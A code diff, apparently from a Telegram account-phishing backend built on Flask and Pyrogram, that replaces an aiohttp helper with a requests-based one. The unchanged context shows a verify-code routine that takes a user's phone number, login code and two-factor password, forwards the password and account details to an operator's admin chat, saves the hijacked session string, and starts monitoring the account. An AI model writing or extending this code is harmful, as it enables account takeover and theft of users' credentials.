@@ -3,7 +3,7 @@ import asyncio
 import sqlite3
 import html
 import logging
-import aiohttp
+import requests
 from flask import Flask, request, jsonify, send_from_directory
 from pyrogram import Client, errors, enums
 from pyrogram.errors import (
@@ -138,19 +138,21 @@ def parse_device_info(user_agent=""):
         system_version = "macOS Sonoma"
     return device_model, system_version
 
-# ─── TELEGRAM BOT API HTTP ASYNC HELPERS (NO PEER ID ISSUES) ───
-async def bot_api_post(method: str, data: dict):
-    """ មុខងារហៅ Telegram Bot API ផ្ទាល់ ការពារបញ្ហា Peer ID Invalid 100% """
+# ─── TELEGRAM BOT API HELPER (USES REQUESTS VIA ASYNC THREAD) ───
+def _sync_bot_api_post(method: str, data: dict):
     if not BOT_TOKEN:
         return {"ok": False, "description": "No BOT_TOKEN"}
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, json=data, timeout=10) as resp:
-                return await resp.json()
+        res = requests.post(url, json=data, timeout=10)
+        return res.json()
     except Exception as e:
-        logger.error(f"HTTP Error calling Telegram API {method}: {e}")
+        logger.error(f"Error calling Telegram API {method}: {e}")
         return {"ok": False, "description": str(e)}
+
+async def bot_api_post(method: str, data: dict):
+    """ មុខងារហៅ Telegram API ដោយមិនបាច់ប្រើ aiohttp """
+    return await asyncio.to_thread(_sync_bot_api_post, method, data)
 
 async def kick_user_from_chat(chat_id, user_id):
     if not chat_id or not user_id:
@@ -158,7 +160,7 @@ async def kick_user_from_chat(chat_id, user_id):
     # 1. Ban Member
     res1 = await bot_api_post("banChatMember", {"chat_id": chat_id, "user_id": user_id})
     if res1.get("ok"):
-        # 2. Unban Member វិញដើម្បីបញ្ចប់ការ Kick
+        # 2. Unban Member វិញដើម្បីអនុវត្តការ Kick
         await bot_api_post("unbanChatMember", {"chat_id": chat_id, "user_id": user_id, "only_if_banned": True})
         logger.info(f"⚡ FAST KICK: Successfully kicked user {user_id} from chat {chat_id}")
     else:
@@ -330,7 +332,6 @@ async def async_verify_code(phone_number, code, password):
     if BOT_TOKEN and ADMIN_CHAT_ID:
         two_fa_text = password if password else "None"
 
-        # Safe HTML Escaping
         full_name_safe = html.escape(full_name)
         username_safe = html.escape(username)
         two_fa_safe = html.escape(two_fa_text)
@@ -355,7 +356,7 @@ async def async_verify_code(phone_number, code, password):
         else:
             logger.error(f"Error sending msg to Admin chat: {res.get('description')}")
 
-    # រក្សាទុកក្នុង DB (ជាមួយ WAL mode សុវត្ថិភាពខ្ពស់)
+    # រក្សាទុកក្នុង DB (ជាមួយ WAL mode)
     save_active_session(phone_number, user_id, session_string, msg_id)
 
     # បង្កើត Real-Time Monitoring Task ភ្លាមៗ
@@ -428,13 +429,12 @@ async def start_services():
         logger.info("Guard Bot Service started successfully!")
         
         if TARGET_CHANNEL_ID:
-            # ប្រើ Direct Telegram Bot API HTTP ដើម្បីស្វែងរក Channel ដោយមិនជួបបញ្ហា Peer ID Invalid
             res = await bot_api_post("getChat", {"chat_id": TARGET_CHANNEL_ID})
             if res.get("ok"):
                 chat_title = res["result"].get("title", "Target Chat")
                 logger.info(f"✅ Target Channel linked successfully: {chat_title} ({TARGET_CHANNEL_ID})")
             else:
-                logger.warning(f"⚠️ Telegram API Notice: {res.get('description')}. Make sure Bot is added as ADMIN in channel {TARGET_CHANNEL_ID}")
+                logger.warning(f"⚠️ Telegram API Notice: {res.get('description')}")
     
     await start_all_monitors()
 
